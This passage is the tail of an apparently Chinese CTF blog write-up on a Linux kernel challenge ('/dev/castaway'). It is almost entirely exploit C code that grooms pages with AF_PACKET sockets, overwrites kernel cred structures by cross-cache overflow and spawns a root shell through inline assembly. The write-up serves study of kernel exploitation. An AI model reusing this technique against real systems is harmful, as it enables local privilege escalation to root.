class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">waiting_for_root_fn</span><span class="params">(<span class="keyword">void</span> *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   xor rdi, rdi; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rdx, 1;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   xor rax, rax; &quot;</span> </span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall;      &quot;</span> <span class="comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rax, 102; &quot;</span> </span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall; &quot;</span>      <span class="comment">/* getuid() */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   cmp rax, 0; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   jne failed; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rdi, 1; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rsi, [root_str]; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rdx, 80; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rax, 1;&quot;</span>    </span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall; &quot;</span>      <span class="comment">/* write(1, root_str, 71) */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rsi, [shell_args];  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   xor rdx, rdx; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rax, 59;  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall;      &quot;</span> <span class="comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;failed: &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rdi, [timer]; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   xor rsi, rsi; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rax, 35; &quot;</span>  </span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall; &quot;</span>      <span class="comment">/* nanosleep() */</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">use_setsockopt_alloc_page</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .tp_block_size = <span class="number">0x1000</span>,</span><br><span class="line">        .tp_block_nr = <span class="number">1</span>,</span><br><span class="line">        .tp_frame_size = <span class="number">0x1000</span>,</span><br><span class="line">        .tp_frame_nr = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> socket_fd, version, ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;setsockopt version error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;setsockopt req error&quot;</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(struct page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    </span><br><span class="line">    initFd(<span class="string">&quot;/dev/castaway&quot;</span>);</span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;step 1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> <span class="title">req</span>;</span></span><br><span class="line">        unshare_setup();</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">            <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">                ret = use_setsockopt_alloc_page();</span><br><span class="line">                socket_fd[req.idx] = ret;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">                ret = close(socket_fd[req.idx]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                errPrint(<span class="string">&quot;invalid request&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">        &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;step 2&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(alloc_page(i) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            errPrint(<span class="string">&quot;alloc_page error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;step 3&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>)&#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe(check_root_pipe);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            errPrint(<span class="string">&quot;clone error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;step 4&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>)&#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*) &amp;buf[<span class="number">512</span> - <span class="number">6</span>] = <span class="number">1</span>;    <span class="comment">/* cred-&gt;usage */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">400</span>; i++) &#123;</span><br><span class="line">        kalloc();</span><br><span class="line">        kwrite(i, <span class="number">512</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;step 5&quot;</span>);</span><br><span class="line">    write(check_root_pipe[<span class="number">1</span>], buf, <span class="number">514</span>);</span><br><span class="line">    sleep(<span class="number">0x5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<p><strong>小结：</strong></p>
+<p>学到了 Cross-Cache Overflow 和页级堆风水</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Cross-Cache-Overflow/" rel="tag"><i class="fa fa-tag"></i> Cross-Cache Overflow</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/16/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AE%9E%E6%88%98-%E7%AE%80%E5%8D%95%E7%BC%96%E8%AF%91%E5%99%A87/" rel="prev" title="编译原理实战-简单编译器7">
+      <i class="fa fa-chevron-left"></i> 编译原理实战-简单编译器7
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">253</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">143</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">3.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">51:35</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
